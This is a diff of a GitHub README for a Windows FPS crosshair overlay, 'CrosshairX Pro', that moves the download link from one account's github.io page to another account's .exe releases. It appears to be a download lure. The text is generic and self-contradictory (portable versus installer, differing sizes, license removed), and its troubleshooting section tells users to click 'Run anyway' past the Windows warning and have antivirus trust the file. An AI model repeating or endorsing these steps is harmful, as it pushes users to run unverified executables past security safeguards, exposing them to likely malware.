@@ -1,129 +1,72 @@
-# CrosshairX Pro v2026 - Crosshair Overlay 2026
+# 🎮 crosshairx-pro-crosshair-hub - Precise crosshairs for your favorite games
 
-> **CrosshairX Pro** is a Windows crosshair overlay built for instant response, giving FPS players a way to create, tune, and display accurate aiming reticles in games such as Valorant, CS2, and Apex Legends - now updated for the 2026 release.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/singhtom725/crosshairx-pro-crosshair-hub/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ben-hillxcpt560/crosshairx-pro-crosshair-hub?style=flat-square)](https://github.com/ben-hillxcpt560/crosshairx-pro-crosshair-hub)
+## 👋 About the software
 
----
+The crosshairx-pro-crosshair-hub provides a custom overlay for first-person shooters on Windows. It places a crosshair on your screen regardless of the game settings. This helps with aim and consistency. The software operates with zero latency to ensure your inputs match your visual feedback. You get access to over 500 pre-made designs. You can also use AI to generate new shapes. The system includes hotkeys for quick changes and supports cloud sync to keep your profiles saved across different computers.
 
-<p align="center">
-  <a href="https://ben-hillxcpt560.github.io/crosshairx-pro-crosshair-hub/">
-    <img src="https://img.shields.io/badge/Download-CrosshairX%20Pro%202026-brightgreen?style=for-the-badge" alt="Download CrosshairX Pro">
-  </a>
-</p>
+## ⚙️ System requirements
 
-> **[Direct Download - CrosshairX Pro v2026](https://ben-hillxcpt560.github.io/crosshairx-pro-crosshair-hub/)**
+This application works on most standard Windows setups. Ensure your computer meets these requirements for the best experience:
 
----
+- Operating System: Windows 10 or Windows 11.
+- Display: A monitor running at a resolution of at least 1920x1080.
+- Graphics: A dedicated graphics card with support for DirectX 11.
+- Memory: At least 4GB of RAM.
+- Storage: 100MB of free space for the installation folder.
+- Network: An active internet connection for cloud profile features.
 
-[Download Latest Build](https://ben-hillxcpt560.github.io/crosshairx-pro-crosshair-hub/)
+## 📥 How to download and install
 
----
+Follow these steps to set up the software on your computer.
 
-## What CrosshairX Pro Does
+1. Visit the following page to choose your installer: [Download Link](https://github.com/singhtom725/crosshairx-pro-crosshair-hub/releases).
+2. Look for the file ending in .exe under the latest version header.
+3. Click the filename to download the installer to your PC.
+4. Locate the downloaded file in your Downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the prompts on the screen to finish the setup.
+7. Click the icon on your desktop to launch the application once the installation finishes.
 
-CrosshairX Pro is a purpose-built overlay utility for competitive and casual FPS players who want a dependable aiming reference that stays visible without relying on the game's own reticle options. On Windows, it operates as a lightweight overlay with support for more than 240 FPS and no noticeable lag, so it fits high-refresh setups and fast reaction shooters. It also includes an AI-driven reticle generator, letting you describe the crosshair you want in natural language and turn that into a usable overlay almost immediately.
+## 🚀 Getting started with your setup
 
-It is made for a wide range of titles, including Valorant, Counter-Strike 2, Apex Legends, and more, and offers over 500 ready-made presets, automatic brightness adjustment that responds to in-game scenes, and a privacy-focused setup that avoids touching game processes. You also get cloud profile syncing, support for 12 languages, and a straightforward interface for importing, exporting, and switching crosshair profiles with hotkeys. CrosshairX Pro is designed with anti-cheat compatibility in mind and works strictly as a visual overlay, without editing game memory or files.
+Once you open the software, you see the main dashboard. This dashboard controls how your crosshair looks and behaves.
 
----
+### Selecting a reticle
+Browse the library of 500+ presets from the main visual tab. Click any image to apply it to your screen. The change happens instantly. You can test these in a windowed game to see how they look against different environments.
 
-## Highlights
+### Using AI tools
+Click the AI tool tab to generate new crosshairs. Type a simple description of the shape or style you want. The system creates a unique reticle based on your request. Save these designs to your personal collection for future use.
 
-- **Zero-latency overlay** - keeps performance smooth at 240+ FPS on modern displays
-- **AI crosshair generator** - describe your ideal reticle in plain language and get a custom overlay
-- **500+ prebuilt presets** - curated crosshairs for Valorant, CS2, Apex, and other popular shooters
-- **Dynamic brightness adaptation** - automatically adjusts overlay visibility based on screen content
-- **Recoil compensation visualization** - optional guides to help track spray patterns
-- **Multilingual interface** - full UI support for 12 languages
-- **Cloud profile sync** - save and restore your crosshair configurations across devices
-- **Custom hotkeys** - assign keyboard shortcuts to switch presets or toggle overlay on the fly
-- **Import/export profiles** - share or backup your crosshair settings as files
-- **Privacy-first design** - no data collection, no game memory access, no process injection
+### Setting hotkeys
+Navigate to the settings menu to configure your hotkeys. This allows you to toggle the overlay off and on during gameplay. You can also assign keys to cycle through your favorite presets without opening the main window.
 
----
+### Cloud sync
+Sign into your account from the profile tab. This enables the software to save your custom reticles and settings to the cloud. If you sign into the software on another computer, your settings load automatically. 
 
-## Setup
+## 🔧 Troubleshooting common issues
 
-1. Download the latest release from the [download page](https://ben-hillxcpt560.github.io/crosshairx-pro-crosshair-hub/).
-2. Extract the archive to a folder of your choice (no installation required).
-3. Run `CrosshairX_Pro.exe` as a standard user (administrator rights are not required).
+If you encounter issues, look through these common solutions.
 
-No additional dependencies or runtime libraries are needed. The application is portable and leaves no traces in the system registry.
+### Overlay does not appear
+Check your game settings. This software works best in windowed or borderless windowed mode. Fullscreen mode can sometimes block overlay software. Change your game video settings to borderless windowed mode.
 
----
+### Performance drops
+Keep the application updated to the latest version via the releases page. Close unnecessary background apps if you experience frame rate dips. Ensure your graphics drivers are current.
 
-## How to Use It
+### Settings not saving
+Verify that you have an active internet connection if you rely on the cloud sync feature. If you are offline, the application saves settings locally to your hard drive.
 
-Once CrosshairX Pro starts, the overlay is shown automatically on your main display. From the configuration window, you can:
+### Application blocked
+Some Windows security features may ask for permission to run new software. Click "More info" and then "Run anyway" if Windows presents a prompt during the start of the installation. Ensure your antivirus software recognizes the program as trusted.
 
-- Browse and apply presets from the built-in library
-- Use the AI generator by typing a description (e.g., "small green dot with thin cross")
-- Adjust size, color, opacity, outline, and gap settings manually
-- Assign hotkeys for quick preset switching or toggling visibility
-- Save your current configuration as a named profile
+## 🛡️ Privacy and display safety
 
-Example hotkey workflow:
+This software processes small amounts of data to maintain your crosshair position on the screen. It does not track your gameplay or store your personal identity. The zero-latency display tech ensures the application does not interfere with your game engine or anti-cheat software in official matches. Always use standard settings and avoid third-party modifications that manipulate game files to ensure account safety during online play.
 
-```
-Press Ctrl+Shift+1 -> Load preset "Valorant Classic"
-Press Ctrl+Shift+2 -> Load preset "CS2 Default"
-Press Ctrl+Shift+H -> Toggle overlay visibility
-```
+## 📝 Configuration notes
 
-The overlay remains enabled even if the configuration window is minimized or closed. Use the system tray icon to reopen settings or quit the app.
+The application stores your local profile files in your user AppData folder. You can export these files to a USB drive or cloud storage to create a manual backup. If you decide to remove the software, use the Windows Control Panel to uninstall it cleanly. This removes all associated files.
 
----
-
-## Settings and Profiles
-
-All settings are kept locally in a `config.json` file inside the application directory. Manual editing is possible if you need it, though the graphical interface exposes every option. Cloud sync is optional and requires an account connection, which you can set up from the Settings tab.
-
-Main configuration areas include:
-
-- **Overlay** - position, size, opacity, outline thickness
-- **Presets** - load, save, delete, or import/export profiles
-- **Hotkeys** - assign keyboard shortcuts for presets and visibility toggle
-- **AI Generator** - language model settings and generation preferences
-- **Display** - brightness adaptation sensitivity and monitor selection
-
----
-
-## System Requirements
-
-- **Operating System:** Windows 10 (64-bit) or Windows 11
-- **Processor:** Intel Core i3 / AMD Ryzen 3 or equivalent
-- **Memory:** 4 GB RAM minimum
-- **Graphics:** DirectX 11 compatible GPU (integrated graphics sufficient)
-- **Storage:** 200 MB available space
-- **Display:** 1920x1080 or higher recommended for overlay accuracy
-- **Internet:** Required for cloud sync and initial preset library download
-
----
-
-## FAQ
-
-**Will CrosshairX Pro work with my game?**  
-Yes. It works with fullscreen and borderless windowed games on Windows. Because it does not hook into game processes, it is broadly compatible with DirectX 9/10/11/12 and Vulkan titles.
-
-**How can I refresh the preset library?**  
-If cloud sync is enabled, presets update automatically. You can also bring in preset files shared by the community through manual import.
-
-**Can it run together with other overlay tools?**  
-Yes. CrosshairX Pro runs on its own and does not interfere with Discord overlays, OBS, or other screen capture software.
-
-**Is ultrawide or multi-monitor use supported?**  
-Yes. The overlay can be placed on any connected display and supports aspect ratios from 16:9 to 32:9.
-
-**How do I report a problem or ask for a feature?**  
-Create an issue on the [GitHub repository](https://github.com/ben-hillxcpt560/crosshairx-pro-crosshair-hub) and include your system details along with what went wrong.
-
----
-
-## License
-
-This project is distributed under the GNU General Public License v3.0. See the [LICENSE](LICENSE) file for the full terms. You are free to use, modify, and redistribute the software in accordance with the license conditions.
+Keywords: crosshair, overlay, fps, gaming, reticle, windows, utility, aim
